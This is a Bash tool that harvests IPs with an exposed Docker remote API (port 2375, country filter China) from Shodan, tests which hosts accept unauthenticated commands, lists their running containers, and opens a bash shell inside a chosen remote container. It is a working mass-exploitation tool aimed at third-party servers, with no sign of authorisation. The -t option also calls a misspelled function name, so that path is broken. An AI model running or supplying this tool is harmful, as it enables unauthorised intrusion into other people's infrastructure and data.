#!/usr/bin/env bash

# Autor: Luis Gerardo | @spawmc in GitHub
# Date: 2022-02-22

ESC_SEQ="\x1b["
COL_RESET=$ESC_SEQ"39;49;00m"
COL_RED=$ESC_SEQ"31;01m"
COL_GREEN=$ESC_SEQ"32;01m"
COL_YELLOW=$ESC_SEQ"33;01m"
COL_BLUE=$ESC_SEQ"34;01m"
COL_MAGENTA=$ESC_SEQ"35;01m"
COL_CYAN=$ESC_SEQ"36;01m"

function _color_success() {
    echo -e "${COL_GREEN}[+] ${1}${COL_RESET}${2}"
}

function _color_error() {
    echo -e "${COL_RED}[-] ${1}${COL_RESET}${2}"
}

function _color_warning() {
    echo -e "${COL_YELLOW}[!] ${1}${COL_RESET}${2}"
}

function _color_info() {
    echo -e "${COL_BLUE}[?] ${1}${COL_RESET}${2}"
}

function _color_flag() {
    echo -e "${COL_CYAN}${1}${COL_YELLOW} ${2}${COL_RESET}"
}

function usage () {
    echo -e "Usage: $0 <file>"
    echo -e "Parameters:"
    _color_flag "            -h:" "Print this help"
    _color_flag "            -e:" "Extract possible IP address with port 2375 open and products named 'Docker', through Shodan CLI tool (You need to have configured your API key)"
    _color_flag " -t [ips_file]:" "Test vulnerable Docker remote service"
    _color_flag " -s [ips_file]:" "Show running containers from a list of IPs"
    _color_flag " -c [ip] [containerID||name]:" "Connect to remote container"
}

function extract_ipaddrs_from_shodan() {
    ip_addr_file="ip_addr.info"
    shodan search --fields ip_str port:2375 product:"Docker" country:"CN" 2>/dev/null > "${ip_addr_file}"
    _color_success "IP address extracted from Shodan"
    _color_success "${COL_BLUE}IPs saved in ${COL_RESET}${COL_YELLOW}${ip_addr_file}${COL_RESET}"
}

function test_vuln_docker () {
    local count=0
    local result_file="./possible_vuln_docker.info"
    local ip_addr_file="${1}"
    _color_info "The output will be saved in " "${COL_YELLOW}${result_file}${COL_RESET}"
    
    for ip_addr in $(cat "${ip_addr_file}"); do
        if timeout --preserve-status 2s docker -H "${ip_addr}":2375 version >/dev/null 2>&1 ; then
            if [[ "${count}" -eq 0 ]]; then
                echo "${ip_addr}" > "${result_file}"
                ((count++))
            else
                echo "${ip_addr}" >> "${result_file}"
            fi
            _color_success "Vulnerable: ${ip_addr}"
        else
            _color_error "Not Vulnerable: ${ip_addr}"
        fi
    done
    
    _color_info "The output will be saved in " "${COL_YELLOW}${result_file}${COL_RESET}"
}

function show_active_containers () {
    local success_ip_addr_file="${1}"
    local result_file="./active_containers.info"
    _color_info "The output will be saved in " "${COL_YELLOW}${result_file}${COL_RESET}"
    
    
    while IFS= read -r ip_addr; do
        _color_info "Showing active containers on " "${COL_MAGENTA}${ip_addr}${COL_RESET}" | tee -a "${result_file}"
        timeout --preserve-status 2s docker -H "${ip_addr}":2375 ps 2>/dev/null | tee -a "${result_file}"
    done < "${success_ip_addr_file}"
    
    _color_info "The output will be saved in " "${COL_YELLOW}${result_file}${COL_RESET}"
}

function connect_to_remote_docker {
    local ip_addr="${1}"
    local container="${2}"
    docker -H "${ip_addr}":2375 exec -it "${container}" /bin/bash
}

optionE=""
optionT=""
paramT=""
optionC=""
paramC=""
optionS=""
paramS=""


while getopts ":het:c:s:" opt; do
    case $opt in
        h)
            usage >&2
            exit 1
        ;;
        e)
            optionE="1"
        ;;
        t)
            optionT="1"
            paramT="${OPTARG}"
        ;;
        c)
            optionC="1"
            paramC="${OPTARG}"
        ;;
        s)
            optionS="1"
            paramS="${OPTARG}"
        ;;
        \?)
            echo "Invalid option: -$OPTARG" >&2
            exit 1
        ;;
        :)
            echo "Option -$OPTARG requires an argument." >&2
            exit 1
        ;;
    esac
done

shift $((OPTIND - 1))

function ctrl_c() {
    echo -e "\n"
    _color_error "Actions have been stopped"
    exit 1;
}

trap ctrl_c INT

[ "${optionE}" ] && extract_ipaddrs_from_shodan && exit 0
[ "${optionT}" ] && test_vuln_docer "${paramT}" && exit 0
[ "${optionC}" ] && connect_to_remote_docker "${paramC}" "$1" && exit 0
[ "${optionS}" ] && show_active_containers "${paramS}" "$1" && exit 0
